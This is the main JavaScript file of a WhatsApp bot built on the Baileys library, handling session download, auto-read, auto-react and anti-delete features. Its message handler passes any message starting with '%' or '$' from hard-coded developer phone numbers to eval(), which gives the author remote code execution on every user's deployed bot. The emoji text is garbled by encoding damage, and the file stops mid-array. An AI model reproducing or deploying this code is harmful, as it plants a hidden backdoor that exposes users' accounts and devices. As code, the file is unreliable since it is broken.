const {
  default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    jidNormalizedUser,
    isJidBroadcast,
    getContentType,
    proto,
    generateWAMessageContent,
    generateWAMessage,
    AnyMessageContent,
    prepareWAMessageMedia,
    areJidsSameUser,
    downloadContentFromMessage,
    MessageRetryMap,
    generateForwardMessageContent,
    generateWAMessageFromContent,
    generateMessageID, makeInMemoryStore,
    jidDecode,
    fetchLatestBaileysVersion,
    Browsers
  } = require('@whiskeysockets/baileys')
  
  
  const l = console.log
  const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson } = require('./lib/functions')
  const { AntiDelDB, initializeAntiDeleteSettings, setAnti, getAnti, getAllAntiDeleteSettings, saveContact, loadMessage, getName, getChatSummary, saveGroupMetadata, getGroupMetadata, saveMessageCount, getInactiveGroupMembers, getGroupMembersMessageCount, saveMessage } = require('./data')
  const fs = require('fs')
  const ff = require('fluent-ffmpeg')
  const P = require('pino')
  const config = require('./config')
  const qrcode = require('qrcode-terminal')
  const StickersTypes = require('wa-sticker-formatter')
  const util = require('util')
  const { sms, downloadMediaMessage, AntiDelete } = require('./lib')
  const FileType = require('file-type');
  const axios = require('axios')
  const { File } = require('megajs')
  const { fromBuffer } = require('file-type')
  const bodyparser = require('body-parser')
  const os = require('os')
  const Crypto = require('crypto')
  const path = require('path')
  const prefix = config.PREFIX
  
  const ownerNumber = ['254794146821']
  
  const tempDir = path.join(os.tmpdir(), 'cache-temp')
  if (!fs.existsSync(tempDir)) {
      fs.mkdirSync(tempDir)
  }
  
  const clearTempDir = () => {
      fs.readdir(tempDir, (err, files) => {
          if (err) throw err;
          for (const file of files) {
              fs.unlink(path.join(tempDir, file), err => {
                  if (err) throw err;
              });
          }
      });
  }
  
  // Clear the temp directory every 5 minutes
  setInterval(clearTempDir, 5 * 60 * 1000);
  
  //===================SESSION-AUTH============================
if (!fs.existsSync(__dirname + '/sessions/creds.json')) {
if(!config.SESSION_ID) return console.log('Please add your session to SESSION_ID env !!')
const sessdata = config.SESSION_ID.replace("nexus~", '');
const filer = File.fromURL(`https://mega.nz/file/${sessdata}`)
filer.download((err, data) => {
if(err) throw err
fs.writeFile(__dirname + '/sessions/creds.json', data, () => {
console.log("Session downloaded âœ…")
})})}

const express = require("express");
const app = express();
const port = process.env.PORT || 9090;
  
  //=============================================
  
  async function connectToWA() {
  console.log("Connecting to WhatsApp â³ï¸...");
  const { state, saveCreds } = await useMultiFileAuthState(__dirname + '/sessions/')
  var { version } = await fetchLatestBaileysVersion()
  
  const conn = makeWASocket({
          logger: P({ level: 'silent' }),
          printQRInTerminal: false,
          browser: Browsers.macOS("Firefox"),
          syncFullHistory: true,
          auth: state,
          version
          })
      
  conn.ev.on('connection.update', (update) => {
  const { connection, lastDisconnect } = update
  if (connection === 'close') {
  if (lastDisconnect.error.output.statusCode !== DisconnectReason.loggedOut) {
  connectToWA()
  }
  } else if (connection === 'open') {
  console.log('ðŸ§¬ Installing Plugins')
  const path = require('path');
  fs.readdirSync("./plugins/").forEach((plugin) => {
  if (path.extname(plugin).toLowerCase() == ".js") {
  require("./plugins/" + plugin);
  }
  });
  console.log('Plugins installed successful âœ…')
  console.log('Bot connected to whatsapp âœ…')
  
  let up = `*âœ¨ Hello, NEXUS-XMD Legend! âœ¨*

â•­â”€ã€” *ðŸ¤– NEXUS-XMD BOT* ã€•  
â”œâ”€â–¸ *Simplicity. Speed. Power. BY Pkdriller |*  
â•°â”€âž¤ *Your New WhatsApp Sidekick is Here!*

*â¤ï¸ Thank you for Choosing NEXUS-XMD!*

â•­â”€â”€ã€” ðŸ”— *Quick Links* ã€•  
â”œâ”€ ðŸ“¢ *Join Our Channel:*  
â”‚   Click [**Here**](https://whatsapp.com/channel/0029Vad7YNyJuyA77CtIPX0x) to join!  
â”œâ”€ â­ *Give Us a Star:*  
â”‚   Star Us [**Here**](https://github.com/Pkdriller/NEXUS-XMD)!  
â•°â”€ðŸ› ï¸ *Prefix:* \`${prefix}\`

> _Â© MADE BY PKDRILLER_`;
    conn.sendMessage(conn.user.id, { image: { url: `https://files.catbox.moe/o3mkn9.jpeg` }, caption: up })
  }
  })
  conn.ev.on('creds.update', saveCreds)

  //==============================

  conn.ev.on('messages.update', async updates => {
    for (const update of updates) {
      if (update.update.message === null) {
        console.log("Delete Detected:", JSON.stringify(update, null, 2));
        await AntiDelete(conn, updates);
      }
    }
  });
  //============================== 
          
  //=============readstatus=======
        
  conn.ev.on('messages.upsert', async(mek) => {
    mek = mek.messages[0]
    if (!mek.message) return
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') 
    ? mek.message.ephemeralMessage.message 
    : mek.message;
    //console.log("New Message Detected:", JSON.stringify(mek, null, 2));
  if (config.READ_MESSAGE === 'true') {
    await conn.readMessages([mek.key]);  // Mark message as read
    console.log(`Marked message from ${mek.key.remoteJid} as read.`);
  }
    if(mek.message.viewOnceMessageV2)
    mek.message = (getContentType(mek.message) === 'ephemeralMessage') ? mek.message.ephemeralMessage.message : mek.message
    if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_SEEN === "true"){
      await conn.readMessages([mek.key])
    }
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
    const jawadlike = await conn.decodeJid(conn.user.id);
    const emojis = ['â¤ï¸', 'ðŸ’¸', 'ðŸ˜‡', 'ðŸ‚', 'ðŸ’¥', 'ðŸ’¯', 'ðŸ”¥', 'ðŸ’«', 'ðŸ’Ž', 'ðŸ’—', 'ðŸ¤', 'ðŸ–¤', 'ðŸ‘€', 'ðŸ™Œ', 'ðŸ™†', 'ðŸš©', 'ðŸ¥°', 'ðŸ’', 'ðŸ˜Ž', 'ðŸ¤Ž', 'âœ…', 'ðŸ«€', 'ðŸ§¡', 'ðŸ˜', 'ðŸ˜„', 'ðŸŒ¸', 'ðŸ•Šï¸', 'ðŸŒ·', 'â›…', 'ðŸŒŸ', 'ðŸ—¿', 'ðŸ‡µðŸ‡°', 'ðŸ’œ', 'ðŸ’™', 'ðŸŒ', 'ðŸ–¤', 'ðŸ’š'];
    const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
    await conn.sendMessage(mek.key.remoteJid, {
      react: {
        text: randomEmoji,
        key: mek.key,
      } 
    }, { statusJidList: [mek.key.participant, jawadlike] });
  }                       
  if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REPLY === "true"){
  const user = mek.key.participant
  const text = `${config.AUTO_STATUS_MSG}`
  await conn.sendMessage(user, { text: text, react: { text: 'ðŸ’œ', key: mek.key } }, { quoted: mek })
            }
            await Promise.all([
              saveMessage(mek),
            ]);
  const m = sms(conn, mek)
  const type = getContentType(mek.message)
  const content = JSON.stringify(mek.message)
  const from = mek.key.remoteJid
  const quoted = type == 'extendedTextMessage' && mek.message.extendedTextMessage.contextInfo != null ? mek.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
  const body = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : ''
  const isCmd = body.startsWith(prefix)
  var budy = typeof mek.text == 'string' ? mek.text : false;
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : ''
  const args = body.trim().split(/ +/).slice(1)
  const q = args.join(' ')
  const text = args.join(' ')
  const isGroup = from.endsWith('@g.us')
  const sender = mek.key.fromMe ? (conn.user.id.split(':')[0]+'@s.whatsapp.net' || conn.user.id) : (mek.key.participant || mek.key.remoteJid)
  const senderNumber = sender.split('@')[0]
  const botNumber = conn.user.id.split(':')[0]
  const pushname = mek.pushName || 'Sin Nombre'
  const isMe = botNumber.includes(senderNumber)
  const isOwner = ownerNumber.includes(senderNumber) || isMe
  const botNumber2 = await jidNormalizedUser(conn.user.id);
  const groupMetadata = isGroup ? await conn.groupMetadata(from).catch(e => {}) : ''
  const groupName = isGroup ? groupMetadata.subject : ''
  const participants = isGroup ? await groupMetadata.participants : ''
  const groupAdmins = isGroup ? await getGroupAdmins(participants) : ''
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber2) : false
  const isAdmins = isGroup ? groupAdmins.includes(sender) : false
  const isReact = m.message.reactionMessage ? true : false
  const reply = (teks) => {
  conn.sendMessage(from, { text: teks }, { quoted: mek })
  }
  const udp = botNumber.split('@')[0];
    const jawad = ('254794146821', '25799056874', '254785392165');
    let isCreator = [udp, jawad, config.DEV]
					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
					.includes(mek.sender);

    if (isCreator && mek.text.startsWith('%')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = eval(code);
						if (typeof resultTest === 'object')
							reply(util.format(resultTest));
						else reply(util.format(resultTest));
					} catch (err) {
						reply(util.format(err));
					}
					return;
				}
    if (isCreator && mek.text.startsWith('$')) {
					let code = budy.slice(2);
					if (!code) {
						reply(
							`Provide me with a query to run Master!`,
						);
						return;
					}
					try {
						let resultTest = await eval(
							'const a = async()=>{\n' + code + '\n}\na()',
						);
						let h = util.format(resultTest);
						if (h === undefined) return console.log(h);
						else reply(h);
					} catch (err) {
						if (err === undefined)
							return console.log('error');
						else reply(util.format(err));
					}
					return;
				}
 //================ownerreact==============
    
  if(senderNumber.includes("254794146821")){
  if(isReact) return
  m.react("ðŸ’™")
   }
  //==========public react============//
  // Auto React 
  if (!isReact && senderNumber !== botNumber) {
      if (config.AUTO_REACT === 'true') {
          const reactions = ['ðŸ˜Š', 'ðŸ‘', 'ðŸ˜‚', 'ðŸ’¯', 'ðŸ”¥', 'ðŸ™', 'ðŸŽ‰', 'ðŸ‘', 'ðŸ˜Ž', 'ðŸ¤–', 'ðŸ‘«', 'ðŸ‘­', 'ðŸ‘¬', 'ðŸ‘®', "ðŸ•´ï¸", 'ðŸ’¼', 'ðŸ“Š', 'ðŸ“ˆ', 'ðŸ“‰', 'ðŸ“Š', 'ðŸ“', 'ðŸ“š', 'ðŸ“°', 'ðŸ“±', 'ðŸ’»', 'ðŸ“»', 'ðŸ“º', 'ðŸŽ¬', "ðŸ“½ï¸", 'ðŸ“¸', 'ðŸ“·', "ðŸ•¯ï¸", 'ðŸ’¡', 'ðŸ”¦', 'ðŸ”§', 'ðŸ”¨', 'ðŸ”©', 'ðŸ”ª', 'ðŸ”«', 'ðŸ‘‘', 'ðŸ‘¸', 'ðŸ¤´', 'ðŸ‘¹', 'ðŸ¤º', 'ðŸ¤»', 'ðŸ‘º', 'ðŸ¤¼', 'ðŸ¤½', 'ðŸ¤¾', 'ðŸ¤¿', 'ðŸ¦', 'ðŸ´', 'ðŸ¦Š', 'ðŸº', 'ðŸ¼', 'ðŸ¾', 'ðŸ¿', 'ðŸ¦„', 'ðŸ¦…', 'ðŸ¦†', 'ðŸ¦‡', 'ðŸ¦ˆ', 'ðŸ³', 'ðŸ‹', 'ðŸŸ', 'ðŸ ', 'ðŸ¡', 'ðŸ™', 'ðŸš', 'ðŸœ', 'ðŸ', 'ðŸž', "ðŸ•·ï¸", 'ðŸ¦‹', 'ðŸ›', 'ðŸŒ', 'ðŸš', 'ðŸŒ¿', 'ðŸŒ¸', 'ðŸ’', 'ðŸŒ¹', 'ðŸŒº', 'ðŸŒ»', 'ðŸŒ´', 'ðŸµ', 'ðŸ°', 'ðŸ ', 'ðŸ¡', 'ðŸ¢', 'ðŸ£', 'ðŸ¥', 'ðŸ¦', 'ðŸ§', 'ðŸ¨', 'ðŸ©', 'ðŸª', 'ðŸ«', 'ðŸ¬', 'ðŸ­', 'ðŸ®', 'ðŸ¯', 'ðŸš£', 'ðŸ›¥', 'ðŸš‚', 'ðŸš', 'ðŸš€', 'ðŸ›¸', 'ðŸ›¹', 'ðŸš´', 'ðŸš²', 'ðŸ›º', 'ðŸš®', 'ðŸš¯', 'ðŸš±', 'ðŸš«', 'ðŸš½', "ðŸ•³ï¸", 'ðŸ’£', 'ðŸ”«', "ðŸ•·ï¸", "ðŸ•¸ï¸", 'ðŸ’€', 'ðŸ‘»', 'ðŸ•º', 'ðŸ’ƒ', "ðŸ•´ï¸", 'ðŸ‘¶', 'ðŸ‘µ', 'ðŸ‘´', 'ðŸ‘±', 'ðŸ‘¨', 'ðŸ‘©', 'ðŸ‘§', 'ðŸ‘¦', 'ðŸ‘ª', 'ðŸ‘«', 'ðŸ‘­', 'ðŸ‘¬', 'ðŸ‘®', "ðŸ•´ï¸", 'ðŸ’¼', 'ðŸ“Š', 'ðŸ“ˆ', 'ðŸ“‰', 'ðŸ“Š', 'ðŸ“', 'ðŸ“š', 'ðŸ“°', 'ðŸ“±', 'ðŸ’»', 'ðŸ“»', 'ðŸ“º', 'ðŸŽ¬', "ðŸ“½ï¸", 'ðŸ“¸', 'ðŸ“·', "ðŸ•¯ï¸", 'ðŸ’¡', 'ðŸ”¦', 'ðŸ”§', 'ðŸ”¨', 'ðŸ”©', 'ðŸ”ª', 'ðŸ”«', 'ðŸ‘‘', 'ðŸ‘¸', 'ðŸ¤´', 'ðŸ‘¹', 'ðŸ¤º', 'ðŸ¤»', 'ðŸ‘º', 'ðŸ¤¼', 'ðŸ¤½', 'ðŸ¤¾', 'ðŸ¤¿', 'ðŸ¦', 'ðŸ´', 'ðŸ¦Š', 'ðŸº', 'ðŸ¼', 'ðŸ¾', 'ðŸ¿', 'ðŸ¦„', 'ðŸ¦…', 'ðŸ¦†', 'ðŸ¦‡', 'ðŸ¦ˆ', 'ðŸ³', 'ðŸ‹', 'ðŸŸ', 'ðŸ ', 'ðŸ¡', 'ðŸ™', 'ðŸš', 'ðŸœ', 'ðŸ', 'ðŸž', "ðŸ•·ï¸", 'ðŸ¦‹', 'ðŸ›', 'ðŸŒ', 'ðŸš', 'ðŸŒ¿', 'ðŸŒ¸', 'ðŸ’', 'ðŸŒ¹', 'ðŸŒº', 'ðŸŒ»', 'ðŸŒ´', 'ðŸµ', 'ðŸ°', 'ðŸ ', 'ðŸ¡', 'ðŸ¢', 'ðŸ ', 'ðŸ¡', 'ðŸ¢', 'ðŸ£', 'ðŸ¥', 'ðŸ¦', 'ðŸ§', 'ðŸ¨', 'ðŸ©', 'ðŸª', 'ðŸ«', 'ðŸ¬', 'ðŸ­', 'ðŸ®', 'ðŸ¯', 'ðŸš£', 'ðŸ›¥', 'ðŸš‚', 'ðŸš', 'ðŸš€', 'ðŸ›¸', 'ðŸ›¹', 'ðŸš´', 'ðŸš²', 'ðŸ›º', 'ðŸš®', 'ðŸš¯', 'ðŸš±', 'ðŸš«', 'ðŸš½', "ðŸ•³ï¸", 'ðŸ’£', 'ðŸ”«', "ðŸ•·ï¸", "ðŸ•¸ï¸", 'ðŸ’€', 'ðŸ‘»', 'ðŸ•º', 'ðŸ’ƒ', "ðŸ•´ï¸", 'ðŸ‘¶', 'ðŸ‘µ', 'ðŸ‘´', 'ðŸ‘±', 'ðŸ‘¨', 'ðŸ‘©', 'ðŸ‘§', 'ðŸ‘¦', 'ðŸ‘ª', 'ðŸ‘«', 'ðŸ‘­', 'ðŸ‘¬', 'ðŸ‘®', "ðŸ•´ï¸", 'ðŸ’¼', 'ðŸ“Š', 'ðŸ“ˆ', 'ðŸ“‰', 'ðŸ“Š', 'ðŸ“', 'ðŸ“š', 'ðŸ“°', 'ðŸ“±', 'ðŸ’»', 'ðŸ“»', 'ðŸ“º', 'ðŸŽ¬', "ðŸ“½ï¸", 'ðŸ“¸', 'ðŸ“·', "ðŸ•¯ï¸", 'ðŸ’¡', 'ðŸ”¦', 'ðŸ”§', 'ðŸ”¨', 'ðŸ”©', 'ðŸ”ª', 'ðŸ”«', 'ðŸ‘‘', 'ðŸ‘¸', 'ðŸ¤´', 'ðŸ‘¹', 'ðŸ¤º', 'ðŸ¤»', 'ðŸ‘º', 'ðŸ¤¼', 'ðŸ¤½', 'ðŸ¤¾', 'ðŸ¤¿', 'ðŸ¦', 'ðŸ´', 'ðŸ¦Š', 'ðŸº', 'ðŸ¼', 'ðŸ¾', 'ðŸ¿', 'ðŸ¦„', 'ðŸ¦…', 'ðŸ¦†', 'ðŸ¦‡', 'ðŸ¦ˆ', 'ðŸ³', 'ðŸ‹', 'ðŸŸ', 'ðŸ ', 'ðŸ¡', 'ðŸ™', 'ðŸš', 'ðŸœ', 'ðŸ', 'ðŸž', "ðŸ•·ï¸", 'ðŸ¦‹', 'ðŸ›', 'ðŸŒ', 'ðŸš', 'ðŸŒ¿', 'ðŸŒ¸', 'ðŸ’', 'ðŸŒ¹', 'ðŸŒº', 'ðŸŒ»', 'ðŸŒ´', 'ðŸµ', 'ðŸ°', 'ðŸ ', 'ðŸ¡', 'ðŸ¢', 'ðŸ£', 'ðŸ¥', 'ðŸ¦', 'ðŸ§', 'ðŸ¨', 'ðŸ©', 'ðŸª', 'ðŸ«', 'ðŸ¬', 'ðŸ­', 'ðŸ®', 'ðŸ¯', 'ðŸš£', 'ðŸ›¥', 'ðŸš‚', 'ðŸš', 'ðŸš€', 'ðŸ›¸', 'ðŸ›¹', 'ðŸš´', 'ðŸš²', 'ðŸ›º', 'ðŸš®', 'ðŸš¯', 'ðŸš±', 'ðŸš«', 'ðŸš½', "ðŸ•³ï¸", 'ðŸ’£', 'ðŸ”«', "ðŸ•·ï¸", "ðŸ•¸ï¸", 'ðŸ’€', 'ðŸ‘»', 'ðŸ•º', 'ðŸ’ƒ', "ðŸ•´ï¸", 'ðŸ‘¶', 'ðŸ‘µ', 'ðŸ‘´', 'ðŸ‘±', 'ðŸ‘¨', 'ðŸ‘©', 'ðŸ‘§', 'ðŸ‘¦', 'ðŸ‘ª', 'ðŸ™‚', 'ðŸ˜‘', 'ðŸ¤£', 'ðŸ˜', 'ðŸ˜˜', 'ðŸ˜—', 'ðŸ˜™', 'ðŸ˜š', 'ðŸ˜›', 'ðŸ˜', 'ðŸ˜ž', 'ðŸ˜Ÿ', 'ðŸ˜ ', 'ðŸ˜¡', 'ðŸ˜¢', 'ðŸ˜­', 'ðŸ˜“', 'ðŸ˜³', 'ðŸ˜´', 'ðŸ˜Œ', 'ðŸ˜†', 'ðŸ˜‚', 'ðŸ¤”', 'ðŸ˜’', 'ðŸ˜“', 'ðŸ˜¶', 'ðŸ™„', 'ðŸ¶', 'ðŸ±', 'ðŸ”', 'ðŸ·', 'ðŸ´', 'ðŸ²', 'ðŸ¸', 'ðŸ³', 'ðŸ‹', 'ðŸ’', 'ðŸ‘', 'ðŸ•', 'ðŸ©', 'ðŸ”', 'ðŸ•', 'ðŸ¥¤', 'ðŸ£', 'ðŸ²', 'ðŸ´', 'ðŸ½', 'ðŸ¹', 'ðŸ¸', 'ðŸŽ‚', 'ðŸ“±', 'ðŸ“º', 'ðŸ“»', 'ðŸŽ¤', 'ðŸ“š', 'ðŸ’»', 'ðŸ“¸', 'ðŸ“·', 'â¤ï¸', 'ðŸ’”', 'â£ï¸', 'â˜€ï¸', 'ðŸŒ™', 'ðŸŒƒ', 'ðŸ ', 'ðŸšª', "ðŸ‡ºðŸ‡¸", "ðŸ‡¬ðŸ‡§", "ðŸ‡¨ðŸ‡¦", "ðŸ‡¦ðŸ‡º", "ðŸ‡¯ðŸ‡µ", "ðŸ‡«ðŸ‡·", "ðŸ‡ªðŸ‡¸", 'ðŸ‘', 'ðŸ‘Ž', 'ðŸ‘', 'ðŸ‘«', 'ðŸ‘­', 'ðŸ‘¬', 'ðŸ‘®', 'ðŸ¤', 'ðŸ™', 'ðŸ‘‘', 'ðŸŒ»', 'ðŸŒº', 'ðŸŒ¸', 'ðŸŒ¹', 'ðŸŒ´', "ðŸžï¸", 'ðŸŒŠ', 'ðŸš—', 'ðŸšŒ', "ðŸ›£ï¸", "ðŸ›«ï¸", "ðŸ›¬ï¸", 'ðŸš£', 'ðŸ›¥', 'ðŸš‚', 'ðŸš', 'ðŸš€', "ðŸƒâ€â™‚ï¸", "ðŸ‹ï¸â€â™€ï¸", "ðŸŠâ€â™‚ï¸", "ðŸ„â€â™‚ï¸", 'ðŸŽ¾', 'ðŸ€', 'ðŸˆ', 'ðŸŽ¯', 'ðŸ†', '??', 'â¬†ï¸', 'â¬‡ï¸', 'â‡’', 'â‡', 'â†©ï¸', 'â†ªï¸', 'â„¹ï¸', 'â€¼ï¸', 'â‰ï¸', 'â€½ï¸', 'Â©ï¸', 'Â®ï¸', 'â„¢ï¸', 'ðŸ”´', 'ðŸ”µ', 'ðŸŸ¢', 'ðŸ”¹', 'ðŸ”º', 'ðŸ’¯', 'ðŸ‘‘', 'ðŸ¤£', "ðŸ¤·â€â™‚ï¸", "ðŸ¤·â€â™€ï¸", "ðŸ™…â€â™‚ï¸", "ðŸ™…â€â™€ï¸", "ðŸ™†â€â™‚ï¸", "ðŸ™†â€â™€ï¸", "ðŸ¤¦â€â™‚ï¸", "ðŸ¤¦â€â™€ï¸", 'ðŸ»', 'ðŸ’†â€â™‚ï¸', "ðŸ’†â€â™€ï¸", "ðŸ•´â€â™‚ï¸", "ðŸ•´â€â™€ï¸", "ðŸ’‡â€â™‚ï¸", "ðŸ’‡â€â™€ï¸", 'ðŸš«', 'ðŸš½', "ðŸ•³ï¸", 'ðŸ’£', 'ðŸ”«', "ðŸ•·ï¸", "ðŸ•¸ï¸", 'ðŸ’€', 'ðŸ‘»', 'ðŸ•º', 'ðŸ’ƒ', "ðŸ•´ï¸", 'ðŸ‘¶', 'ðŸ‘µ', 'ðŸ‘´', 'ðŸ‘±', 'ðŸ‘¨', 'ðŸ‘©', 'ðŸ‘§', 'ðŸ‘¦', 'ðŸ‘ª', 'ðŸ‘«', 'ðŸ‘­', 'ðŸ‘¬', 'ðŸ‘®', "ðŸ•´ï¸", 'ðŸ’¼', 'ðŸ“Š', 'ðŸ“ˆ', 'ðŸ“‰', 'ðŸ“Š', 'ðŸ“', 'ðŸ“š', 'ðŸ“°', 'ðŸ“±', 'ðŸ’»', 'ðŸ“»', 'ðŸ“º', 'ðŸŽ¬', "ðŸ“½ï¸", 'ðŸ“¸', 'ðŸ“·', "ðŸ•¯ï¸", 'ðŸ’¡', 'ðŸ”¦', 'ï¿½', 'ðŸ¯', 'ðŸ°', 'ðŸ ', 'ðŸ¡', 'ðŸ¢', 'ðŸ£', 'ðŸ¥', 'ðŸ¦', 'ðŸ§', 'ðŸ¨', 'ðŸ©', 'ðŸª', 'ðŸ«', 'ðŸ¬', 'ðŸ­', 'ðŸ®', 'ðŸ¯', 'ðŸš£', 'ðŸ›¥', 'ðŸš‚', 'ðŸš', 'ðŸš€', 'ðŸ›¸', 'ðŸ›¹', 'ðŸš´', 'ðŸš²', 'ðŸ›º', 'ðŸš®', 'ðŸš¯', 'ðŸš±', 'ðŸš«', 'ðŸš½', "ðŸ•³ï¸", 'ðŸ’£', 'ðŸ”«', "ðŸ•·ï¸", "ðŸ•¸ï¸", 'ðŸ’€', 'ðŸ‘»', 'ðŸ•º', 'ðŸ’ƒ', "ðŸ•´ï¸", 'ðŸ‘¶', 'ðŸ‘µ', 'ðŸ‘´', 'ðŸ‘±', 'ðŸ‘¨', 'ðŸ‘©', 'ðŸ‘§', 'ðŸ‘¦', 'ðŸ‘ª', 'ðŸ‘«', 'ðŸ‘­', 'ðŸ‘¬', 'ðŸ‘®', "ðŸ•´ï¸", 'ðŸ’¼', 'ðŸ“Š', 'ðŸ“ˆ', 'ðŸ“‰', 'ðŸ“Š', 'ðŸ“', 'ðŸ“š', 'ðŸ“°', 'ðŸ“±', 'ðŸ’»', 'ðŸ“»', 'ðŸ“º', 'ðŸŽ¬', "ðŸ“½ï¸", 'ðŸ“¸', 'ðŸ“·', "ðŸ•¯ï¸", 'ðŸ’¡', 'ðŸ”¦', 'ðŸ”§', 'ðŸ”¨', 'ðŸ”©', 'ðŸ”ª', 'ðŸ”«', 'ðŸ‘‘', 'ðŸ‘‘', 'ðŸ‘¸', 'ðŸ¤´', 'ðŸ‘¹', 'ðŸ¤º', 'ðŸ¤»', 'ðŸ‘º', 'ðŸ¤¼', 'ðŸ¤½', 'ðŸ¤¾', 'ðŸ¤¿', 'ðŸ¦', 'ðŸ´', 'ðŸ¦Š', 'ðŸº', 'ðŸ¼', 'ðŸ¾', 'ðŸ¿', 'ðŸ¦„', 'ðŸ¦…', 'ðŸ¦†', 'ðŸ¦‡', 'ðŸ¦ˆ', 'ðŸ³', 'ðŸ‹', 'ðŸŸ', 'ðŸ ', 'ðŸ¡', 'ðŸ™', 'ðŸš', 'ðŸœ', 'ðŸ', 'ðŸž', "ðŸ•·ï¸", 'ðŸ¦‹', 'ðŸ›', 'ðŸŒ', 'ðŸš', 'ðŸŒ¿', 'ðŸŒ¸', 'ðŸ’', 'ðŸŒ¹', 'ðŸŒº', 'ðŸŒ»', 'ðŸŒ´', 'ðŸŒ³', 'ðŸŒ²', 'ðŸŒ¾', 'ðŸŒ¿', 'ðŸƒ', 'ðŸ‚', 'ðŸƒ', 'ðŸŒ»', 'ðŸ’', 'ðŸŒ¹', 'ðŸŒº', 'ðŸŒ¸', 'ðŸŒ´', 'ðŸµ', 'ðŸŽ€', 'ðŸ†', 'ðŸˆ', 'ðŸ‰', 'ðŸŽ¯', 'ðŸ€', 'ðŸŠ', 'ðŸ‹', 'ðŸŒ', 'ðŸŽ²', 'ðŸ“š', 'ðŸ“–', 'ðŸ“œ', 'ðŸ“', 'ðŸ’­', 'ðŸ’¬', 'ðŸ—£', 'ðŸ’«', 'ðŸŒŸ', 'ðŸŒ ', 'ðŸŽ‰', 'ðŸŽŠ', 'ðŸ‘', 'ðŸ’¥', 'ðŸ”¥', 'ðŸ’¥', 'ðŸŒª', 'ðŸ’¨', 'ðŸŒ«', 'ðŸŒ¬', 'ðŸŒ©', 'ðŸŒ¨', 'ðŸŒ§', 'ðŸŒ¦', 'ðŸŒ¥', 'ðŸŒ¡', 'ðŸŒª', 'ðŸŒ«', 'ðŸŒ¬', 'ðŸŒ©', 'ðŸŒ¨', 'ðŸŒ§', 'ðŸŒ¦', 'ðŸŒ¥', 'ðŸŒ¡', 'ðŸŒª', 'ðŸŒ«', 'ðŸŒ¬', 'ðŸŒ©', 'ðŸŒ¨', 'ðŸŒ§', 'ðŸŒ¦', 'ðŸŒ¥', 'ðŸŒ¡', 'ðŸŒ±', 'ðŸŒ¿', 'ðŸƒ', 'ðŸ‚', 'ðŸŒ»', 'ðŸ’', 'ðŸŒ¹', 'ðŸŒº', 'ðŸŒ¸', 'ðŸŒ´', 'ðŸµ', 'ðŸŽ€', 'ðŸ†', 'ðŸˆ', 'ðŸ‰', 'ðŸŽ¯', 'ðŸ€', 'ðŸŠ', 'ðŸ‹', 'ðŸŒ', 'ðŸŽ²', 'ðŸ“š', 'ðŸ“–', 'ðŸ“œ', 'ðŸ“', 'ðŸ’­', 'ðŸ’¬', 'ðŸ—£', 'ðŸ’«', 'ðŸŒŸ', 'ðŸŒ ', 'ðŸŽ‰', 'ðŸŽŠ', 'ðŸ‘', 'ðŸ’¥', 'ðŸ”¥', 'ðŸ’¥', 'ðŸŒª', 'ðŸ’¨', 'ðŸŒ«', 'ðŸŒ¬', 'ðŸŒ©', 'ðŸŒ¨', 'ðŸŒ§', 'ðŸŒ¦', 'ðŸŒ¥', 'ðŸŒ¡', 'ðŸŒª', 'ðŸŒ«', 'ðŸŒ¬', 'ðŸŒ©', 'ðŸŒ¨', 'ðŸŒ§', 'ðŸŒ¦', 'ðŸŒ¥', 'ðŸŒ¡', "ðŸ•¯ï¸", 'ðŸ’¡', 'ðŸ”¦', 'ðŸ”§', 'ðŸ”¨', 'ðŸ”©', 'ðŸ”ª', 'ðŸ”«', 'ðŸ‘‘', 'ðŸ‘¸', 'ðŸ¤´', 'ðŸ‘¹', 'ðŸ¤º', 'ðŸ¤»', 'ðŸ‘º', 'ðŸ¤¼', 'ðŸ¤½', 'ðŸ¤¾', 'ðŸ¤¿', 'ðŸ¦', 'ðŸ´', 'ðŸ¦Š', 'ðŸº', 'ðŸ¼', 'ðŸ¾', 'ðŸ¿', 'ðŸ¦„', 'ðŸ¦…', 'ðŸ¦†', 'ðŸ¦‡', 'ðŸ¦ˆ', 'ðŸ³', 'ðŸ‹', 'ðŸŸ', 'ðŸ ', 'ðŸ¡', 'ðŸ™', 'ðŸš', 'ðŸœ', 'ðŸ', 'ðŸž', "ðŸ•·ï¸", 'ðŸ¦‹', 'ðŸ›', 'ðŸŒ', 'ðŸš', 'ðŸŒ¿', 'ðŸŒ¸', 'ðŸ’', 'ðŸŒ¹', 'ðŸŒº', 'ðŸŒ»', 'ðŸŒ´', 'ðŸµ', 'ðŸ°', 'ðŸ ', 'ðŸ¡', 'ðŸ¢', 'ðŸ£', 'ðŸ¥', 'ðŸ¦', 'ðŸ§', 'ðŸ¨', 'ðŸ©', 'ðŸª', 'ðŸ«', 'ðŸ¬', 'ðŸ­', 'ðŸ®', 'ðŸ¯', 'ðŸš£', 'ðŸ›¥', 'ðŸš‚', 'ðŸš', 'ðŸš€', 'ðŸ›¸', 'ðŸ›¹', 'ðŸš´', 'ðŸš²', 'ðŸ›º', 'ðŸš®', 'ðŸš¯', 'ðŸš±', 'ðŸš«', 'ðŸš½', "ðŸ•³ï¸", 'ðŸ’£', 'ðŸ”«', "ðŸ•·ï¸", "ðŸ•¸ï¸", 'ðŸ’€', 'ðŸ‘»', 'ðŸ•º', 'ðŸ’ƒ', "ðŸ•´ï¸", 'ðŸ‘¶', 'ðŸ‘µ', 'ðŸ‘´', 'ðŸ‘±', 'ðŸ‘¨', 'ðŸ‘©', 'ðŸ‘§', 'ðŸ‘¦', 